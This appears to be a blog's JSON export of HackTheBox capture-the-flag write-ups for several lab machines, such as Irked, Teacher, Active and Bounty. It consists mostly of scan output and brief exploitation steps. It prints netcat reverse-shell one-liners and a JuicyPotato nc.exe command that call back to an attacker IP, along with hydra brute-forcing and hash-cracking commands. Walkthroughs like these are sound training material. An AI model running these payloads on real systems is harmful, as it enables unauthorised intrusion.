| 100000 3,4 111/udp6 rpcbind | 100024 1 35649/udp6 status | 100024 1 44214/tcp6 status | 100024 1 58258/tcp status |_ 100024 1 59795/udp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 58258/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd (Admin email djmardov@irked.htb) Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds Web server Foothold We have an open irc port Let\u0026rsquo;s connect Create and edit new network: irked in screenshots below Setup connection: change newserver/6697 to 10.10.10.117/6697 We can add the network to favorites and filter everything out And finally connect Nothing interesting except the version of the software Let\u0026rsquo;s use searchsploit to search for vulnerabilities And we find a few Let\u0026rsquo;s test rce Seems like it works Let\u0026rsquo;s get our foothold payload: AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.3 6666 \u0026gt;/tmp/f User Now we need to privesc Enumerate as usual We see interesting file in /home/djmardov/Documents directory Let\u0026rsquo;s open it It certainly implies stenography and we have an image on the website Let\u0026rsquo;s check it I used steghide And we have our user Root Basic enumeration linpeas or manual sudo -l - no results search for suid binaries: find / -perm -4000 -exec ls -lha {} \\; 2\u0026gt;/dev/null Strange vievuser file We have an error that sh can\u0026rsquo;t locate /tmp/listusers Let\u0026rsquo;s create file and add whoami just in case it will execute it So, we can pretty much execute anyhing Start listener and add reverse shell payload to /tmp/listusers Rooted ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/irked/images/irked.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/irked/","summary":"Irked Enumeration nmap └─$ nmap -Pn -p- 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:23 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 58258/tcp open unknown 65534/tcp open unknown └─$ nmap -sV -sC -p22,80,111,6697,8067,58258,65534 10.10.10.117 Starting Nmap 7.93 ( https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Irked"},{"categories":null,"contents":"Teacher Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.153 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 16:50 BST Nmap scan report for 10.10.10.153 (10.10.10.153) Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.53 seconds gobuster └─$ gobuster dir -u http://10.10.10.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.153 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,html [+] Timeout: 10s =============================================================== 2023/06/15 16:47:54 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/images/] /index.html (Status: 200) [Size: 8028] /gallery.html (Status: 200) [Size: 8254] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.153/css/] /manual (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/manual/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.153/js/] /javascript (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.153/javascript/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.153/fonts/] /phpmyadmin (Status: 403) [Size: 297] /moodle (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/moodle/] /.html (Status: 403) [Size: 292] /server-status (Status: 403) [Size: 300] Web server Checked a few interesting paths provided by gobuster Foothold I spend so much time searching for clues Checked searchploit Found a few rce exploit, but they require authentification Checked /images And found a note We have piece of the password, let\u0026rsquo;s write a script to generate all possible variations Let\u0026rsquo;s run hydra hydra -l Giovanni -P passwords.list teacher.htb http-post-form \u0026quot;/moodle/login/index.php:anchor=\u0026amp;username=^USER^\u0026amp;password=^PASS^\u0026amp;rememberusername=1:Invalid login\u0026quot; Now we can check the exploits There is a post explaining rce in moodle Now we need to follow the steps and get our rce\nLaunch a listener And perform the steps defined in the post The following screenshots contain the steps described in the post Login, turn on editing and add an activity to any topic\nSelect Quiz Fill in required fields and save Open quiz and click on edit quiz button Add a new question Select calculated Fill in required forms Add payload to Answer field Save and click next Add payload to end of url \u0026amp;0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;%261|nc 10.10.16.3 6666 \u0026gt;/tmp/f We got a foothold User Enumerate We can run linpeas I started with basic enumeration sudo -l with no success find / -perm -4000 -exec ls -lha {} \\; 2\u0026gt;/dev/null no success ps -ef showed that we have a mysql running Let\u0026rsquo;s check the /var/www/html/moodle folder Search for db configuration file We found config.php Open it and use the creds stored to connect to mysql mysql -u root -p Found creds stored in moodle db and mdl_user table Checked hash in Crackstation su to giovanni Root Enumerate again pspy and linpeas Let\u0026rsquo;s open the script We have few variants Change permissions using symbolic links ln -s since for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file So we can create links to /etc/passwd -\u0026gt; modify it by adding root user /etc/shadow -\u0026gt; modify it by adding root user or crack root hash /usr/bin/backup.sh -\u0026gt; append reverse shell payload I prefered the last option Setup listener and wait for connection Rooted ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/teacher/images/teacher.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/teacher/","summary":"Teacher Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.153 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 16:50 BST Nmap scan report for 10.10.10.153 (10.10.10.153) Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.","tags":["HTB"],"title":"[HTB] Machine: Teacher"},{"categories":null,"contents":"Active Enumeration nmap └─$ nmap -sC -sV 10.10.10.100 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining) Nmap scan report for 10.10.10.100 (10.10.10.100) Host is up (0.17s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-11 08:34:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-11T08:35:17 |_ start_date: 2023-06-11T08:16:24 | smb2-security-mode: | 210: |_ Message signing enabled and required |_clock-skew: -30s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 104.06 seconds SMB enumeration enum4linux 10.10.10.100 Check Replication share ┌──(kali㉿kali)-[~] └─$ smbmap -H 10.10.10.100 -R [+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY .\\Replication\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 active.htb .\\Replication\\active.htb\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 DfsrPrivate dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Policies dr--r--r-- 0 Sat Jul 21 11:37:44 2018 scripts .\\Replication\\active.htb\\DfsrPrivate\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 ConflictAndDeleted dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Deleted dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Installing .\\Replication\\active.htb\\Policies\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9} dr--r--r-- 0 Sat Jul 21 11:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9} .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 23 Sat Jul 21 11:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Group Policy dr--r--r-- 0 Sat Jul 21 11:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 11:37:44 2018 USER .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 119 Sat Jul 21 11:38:11 2018 GPE.INI .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Microsoft dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Preferences fr--r--r-- 2788 Sat Jul 21 11:38:11 2018 Registry.pol .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Windows NT .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Groups .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 22 Sat Jul 21 11:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 11:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 11:37:44 2018 USER .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Microsoft .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Windows NT SYSVOL NO ACCESS Logon server share Users NO ACCESS Let\u0026rsquo;s open Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; ~ Foothold/User We got a password from smb enumeration Let\u0026rsquo;s decrypt using gpp-decrypt Root Since it\u0026rsquo;s a Domain Controller Let\u0026rsquo;s do basic enumeration for Active Directory Check SPN\u0026rsquo;s And we get Administrator\u0026rsquo;s hash Let\u0026rsquo;s crack it hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/active/images/active.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/active/","summary":"Active Enumeration nmap └─$ nmap -sC -sV 10.10.10.100 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining) Nmap scan report for 10.10.10.100 (10.10.10.100) Host is up (0.17s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.","tags":["HTB"],"title":"[HTB] Machine: Active"},{"categories":null,"contents":"Bashed Enumeration nmap └─$ nmap -sC -sV 10.10.10.68 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 18:47 BST Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds gobuster └─$ gobuster dir -u http://10.10.10.68/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.68/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/08 19:48:11 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.68/uploads/] /config.php (Status: 200) [Size: 0] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/dev/] /php (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/php/] /js (Status: 301) [Size: 307] [--\u0026gt; http://10.10.10.68/js/] /css (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/css/] /fonts (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.68/fonts/] /server-status (Status: 403) [Size: 299] /.php (Status: 403) [Size: 290] Webserver Foothold/User Let\u0026rsquo;s check dev directory We see phpbash.php Let\u0026rsquo;s open it And we get a webshell Let\u0026rsquo;s try to upgrade the shell Setup a listener and send a reverse shell payload Root Enumerate for privesc sudo -l We can sudo as scriptmanager Let\u0026rsquo;s launch bash as scriptmanager Enumerate as scriptmanager We see interesting directory named /scripts owned by scriptmanager Let\u0026rsquo;s check it Open the script and analyse You will see that it creates a test.txt Notice that the test.txt is owned by root It looks like there is an automated process or cronjob that launches test.py as a root use pspy64 So we can change the content of the test.py and get reverse shell ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bashed/images/bashed.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bashed/","summary":"Bashed Enumeration nmap └─$ nmap -sC -sV 10.10.10.68 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 18:47 BST Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.","tags":["HTB"],"title":"[HTB] Machine: Bashed"},{"categories":null,"contents":"Bounty Enumeration nmap └─$ nmap -sC -sV 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:26 BST Nmap scan report for 10.10.10.93 (10.10.10.93) Host is up (0.098s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds gobuster └─$ gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,apsx [+] Timeout: 10s =============================================================== 2023/06/10 16:39:26 Starting gobuster in directory enumeration mode =============================================================== /transfer.aspx (Status: 200) [Size: 941] /UploadedFiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/UploadedFiles/] /uploadedFiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/uploadedFiles/] /uploadedfiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/uploadedfiles/] Progress: 661634 / 661683 (99.99%) =============================================================== 2023/06/10 17:15:00 Finished =============================================================== Web server Foothold/User We see transfer.aspx and uploadedFiles endpoints available Let\u0026rsquo;s upload a file Success But I couldn\u0026rsquo;t upload a file with aspx extension there is a blog and this one from the same author Test out the poc And we see that we have rce I was trying different variations of poc but had no success Turns out, I broke the box so I needed to reboot it Then I used the same poc from the first blog as in the picture above But added few modifications, using /usr/share/webshells/asp/cmdasp.asp Let\u0026rsquo;s upload and run it And we get our foothold Root Enumerate privileges whoami /priv We see SeImpersonatePrivilege Let\u0026rsquo;s run JuicyPotato So download binary and nc.exe Set up new listener .\\jp.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \u0026quot;/c c:\\users\\merlin\\downloads\\nc.exe 10.10.16.3 7777 -e cmd.exe\u0026quot; -t * And root the box ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bounty/images/bounty.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bounty/","summary":"Bounty Enumeration nmap └─$ nmap -sC -sV 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:26 BST Nmap scan report for 10.10.10.93 (10.10.10.93) Host is up (0.098s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Bounty"},{"categories":null,"contents":"Jerry Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.95 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 12:02 BST Nmap scan report for 10.10.10.95 (10.10.10.95) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds Web Server Foothold/User/Root Let\u0026rsquo;s try default creds for Tomcat's Manager Application tomcat:s3cret Success Now we can deploy our app Generate payload using msvenom with externsion war Upload it Let\u0026rsquo;s find the jsp page generated by msfvenom Open the path And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/jerry/images/jerry.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/jerry/","summary":"Jerry Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.95 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 12:02 BST Nmap scan report for 10.10.10.95 (10.10.10.95) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Jerry"},{"categories":null,"contents":"Nibbles nmap └─$ nmap -sC -sV 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 17:13 BST Nmap scan report for 10.10.10.75 (10.10.10.75) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.68 seconds We see the comment in the page source gobuster └─$ gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.75/nibbleblog [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/08 17:38:18 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 321] [--\u0026gt; http://10.10.10.75/nibbleblog/admin/] /feed.php (Status: 200) [Size: 302] /install.php (Status: 200) [Size: 78] /content (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/content/] /languages (Status: 301) [Size: 325] [--\u0026gt; http://10.10.10.75/nibbleblog/languages/] /sitemap.php (Status: 200) [Size: 402] /themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.10.75/nibbleblog/themes/] /admin.php (Status: 200) [Size: 1401] /index.php (Status: 200) [Size: 2987] /plugins (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/plugins/] /update.php (Status: 200) [Size: 1622] /.php (Status: 403) [Size: 301] Let\u0026rsquo;s check admin.php We see the version of the Nibbleblog Foothold/User Let\u0026rsquo;s search for exploits We found the file upload exploit which can be launched only as an authenticated user Let\u0026rsquo;s enumerate other directories that were found by gobuster We found username No signs of password, so let\u0026rsquo;s try guessing, since there are no default passwords Luckily it was the name of the box Now we can launch file upload attack And get our shell Root Basic privesc enumeration sudo -l Let\u0026rsquo;s check the indicated path We can create a new file with the same name or append the code we want it to execute I created new file which deployed a reverse shell And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nibbles/images/nibbles.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nibbles/","summary":"Nibbles nmap └─$ nmap -sC -sV 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 17:13 BST Nmap scan report for 10.10.10.75 (10.10.10.75) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.","tags":["HTB"],"title":"[HTB] Machine: Nibbles"},{"categories":null,"contents":"Sense Enumeration nmap └─$ nmap -sC -sV 10.10.10.60 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:21 BST Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.11s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_http-title: Login |_http-server-header: lighttpd/1.4.35 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds d └─$ gobuster dir -u https://10.10.10.60/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.60/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/09 16:46:37 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 6690] /help.php (Status: 200) [Size: 6689] /themes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/themes/] /stats.php (Status: 200) [Size: 6690] /css (Status: 301) [Size: 0] [--\u0026gt; 